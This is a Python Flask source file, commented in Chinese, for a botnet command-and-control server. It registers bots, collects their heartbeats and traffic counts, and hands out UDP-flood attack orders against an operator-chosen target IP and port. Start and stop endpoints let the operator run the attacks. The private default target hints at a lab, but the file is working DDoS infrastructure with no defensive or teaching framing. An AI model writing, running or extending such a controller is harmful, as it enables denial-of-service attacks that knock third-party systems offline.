#!/usr/bin/env python3
"""
C&C (Command and Control) Server
僵尸网络控制服务器
"""

from flask import Flask, request, jsonify, render_template
import threading
import time
from datetime import datetime

app = Flask(__name__)

# 全局状态
bots = {}  # 已注册的bot
attack_config = {
    "active": False,
    "target_ip": "",
    "target_port": 9999,
    "attack_type": "udp_flood",
    "duration": 60,
    "intensity": "medium"
}
attack_stats = {}  # 攻击统计

# 线程锁
lock = threading.Lock()

@app.route('/')
def dashboard():
    """控制面板首页"""
    return render_template('dashboard.html')

@app.route('/api/register', methods=['POST'])
def register_bot():
    """Bot注册接口"""
    try:
        data = request.json
        if not data:
            return jsonify({"status": "error", "message": "No data provided"}), 400
            
        bot_id = data.get('bot_id')
        bot_ip = data.get('bot_ip')
        
        if not bot_id:
            return jsonify({"status": "error", "message": "bot_id required"}), 400
        
        with lock:
            bots[bot_id] = {
                "ip": bot_ip,
                "status": "idle",
                "last_seen": time.time(),
                "packets_sent": 0,
                "bytes_sent": 0
            }
        
        print(f"[C&C] ✓ Bot注册成功: {bot_id} ({bot_ip})")
        return jsonify({"status": "success", "message": "Bot registered"})
    except Exception as e:
        print(f"[C&C] ✗ Bot注册失败: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/heartbeat', methods=['POST'])
def heartbeat():
    """Bot心跳接口"""
    try:
        data = request.json
        if not data:
            return jsonify({"status": "error", "message": "No data"}), 400
            
        bot_id = data.get('bot_id')
        
        if not bot_id:
            return jsonify({"status": "error", "message": "bot_id required"}), 400
        
        with lock:
            if bot_id in bots:
                bots[bot_id]['last_seen'] = time.time()
                # 更新统计信息
                if 'packets_sent' in data:
                    bots[bot_id]['packets_sent'] = data['packets_sent']
                if 'bytes_sent' in data:
                    bots[bot_id]['bytes_sent'] = data['bytes_sent']
                if 'status' in data:
                    bots[bot_id]['status'] = data['status']
            else:
                # Bot未注册，返回错误让它重新注册
                return jsonify({"status": "error", "message": "Bot not registered"}), 404
        
        return jsonify({"status": "success"})
    except Exception as e:
        print(f"[C&C] 心跳处理失败: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/command/<bot_id>', methods=['GET'])
def get_command(bot_id):
    """Bot获取指令接口"""
    with lock:
        if attack_config['active']:
            return jsonify({
                "action": "attack",
                "target_ip": attack_config['target_ip'],
                "target_port": attack_config['target_port'],
                "attack_type": attack_config['attack_type'],
                "duration": attack_config['duration'],
                "intensity": attack_config['intensity']
            })
        else:
            return jsonify({"action": "idle"})

@app.route('/api/start_attack', methods=['POST'])
def start_attack():
    """启动攻击"""
    data = request.json
    
    with lock:
        attack_config['active'] = True
        attack_config['target_ip'] = data.get('target_ip', '10.10.20.20')
        attack_config['target_port'] = data.get('target_port', 9999)
        attack_config['attack_type'] = data.get('attack_type', 'udp_flood')
        attack_config['duration'] = data.get('duration', 60)
        attack_config['intensity'] = data.get('intensity', 'medium')
    
    print(f"[C&C] 启动攻击: {attack_config['target_ip']}:{attack_config['target_port']}")
    return jsonify({"status": "success", "message": "Attack started"})

@app.route('/api/stop_attack', methods=['POST'])
def stop_attack():
    """停止攻击"""
    with lock:
        attack_config['active'] = False
    
    print("[C&C] 停止攻击")
    return jsonify({"status": "success", "message": "Attack stopped"})

@app.route('/api/status', methods=['GET'])
def get_status():
    """获取整体状态"""
    with lock:
        online_bots = sum(1 for bot in bots.values() 
                         if time.time() - bot['last_seen'] < 10)
        
        total_packets = sum(bot.get('packets_sent', 0) for bot in bots.values())
        total_bytes = sum(bot.get('bytes_sent', 0) for bot in bots.values())
        
        bot_list = []
        for bot_id, bot_info in bots.items():
            bot_list.append({
                "bot_id": bot_id,
                "ip": bot_info['ip'],
                "status": bot_info['status'],
                "packets_sent": bot_info.get('packets_sent', 0),
                "bytes_sent": bot_info.get('bytes_sent', 0),
                "online": time.time() - bot_info['last_seen'] < 10
            })
        
        return jsonify({
            "total_bots": len(bots),
            "online_bots": online_bots,
            "attack_active": attack_config['active'],
            "attack_config": attack_config,
            "total_packets": total_packets,
            "total_bytes": total_bytes,
            "bots": bot_list
        })

def cleanup_offline_bots():
    """清理离线的bot"""
    while True:
        time.sleep(30)
        with lock:
            current_time = time.time()
            offline_bots = [bot_id for bot_id, bot_info in bots.items()
                           if current_time - bot_info['last_seen'] > 60]
            for bot_id in offline_bots:
                print(f"[C&C] Bot离线: {bot_id}")
                del bots[bot_id]

if __name__ == '__main__':
    # 启动清理线程
    cleanup_thread = threading.Thread(target=cleanup_offline_bots, daemon=True)
    cleanup_thread.start()
    
    print("=" * 60)
    print("C&C服务器启动")
    print("控制面板: http://localhost:5000")
    print("=" * 60)
    
    app.run(host='0.0.0.0', port=5000, debug=False)
